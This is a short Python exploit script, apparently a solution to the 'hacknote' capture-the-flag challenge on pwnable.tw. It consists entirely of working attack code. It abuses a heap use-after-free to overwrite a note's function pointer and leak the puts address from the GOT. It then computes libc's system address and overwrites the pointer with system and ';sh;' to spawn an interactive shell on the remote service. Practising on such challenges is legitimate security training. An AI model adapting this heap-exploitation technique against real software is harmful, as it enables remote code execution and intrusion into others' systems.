from pwn import *
#io = process('./hacknote')
io = remote('chall.pwnable.tw', 10102)
context.log_level = 'debug'
def add_note(size, content):
    io.recvuntil("Your choice :")
    io.sendline('1')
    io.recvuntil("Note size :")
    io.sendline(str(size))
    io.recvuntil("Content :")
    io.send(content)

def del_note(idx):
    io.recvuntil('Your choice :')
    io.sendline('2')
    io.recvuntil('Index :')
    io.sendline(str(idx))

def print_note(idx):
    io.recvuntil('Your choice :')
    io.sendline('3')
    io.recvuntil('Index :')
    io.sendline(str(idx))

add_note(0x8, 'a' * 0x8) #0
add_note(0x8, 'b' * 0x8) #1
del_note(1)
del_note(0)

add_note(0x18, 'c' * 0x18) #2 mis confuse the glibc
puts_got = 0x804a024
#malloc another one so that the content will be malloced in chunk1's note chunk
add_note(0x8, p32(0x804862b) + p32(puts_got)) #3
print_note(1) #leak puts_libc

l = ELF('/tmp/libc')
puts_libc = u32(io.recvn(4))
log.info('puts_libc :' + hex(puts_libc))
system_libc = puts_libc - l.symbols['puts'] + l.symbols['system']
log.info('system_libc :' + hex(system_libc))

del_note(3)
add_note(0x8, p32(system_libc) + ';sh;')
print_note(1)

io.interactive()

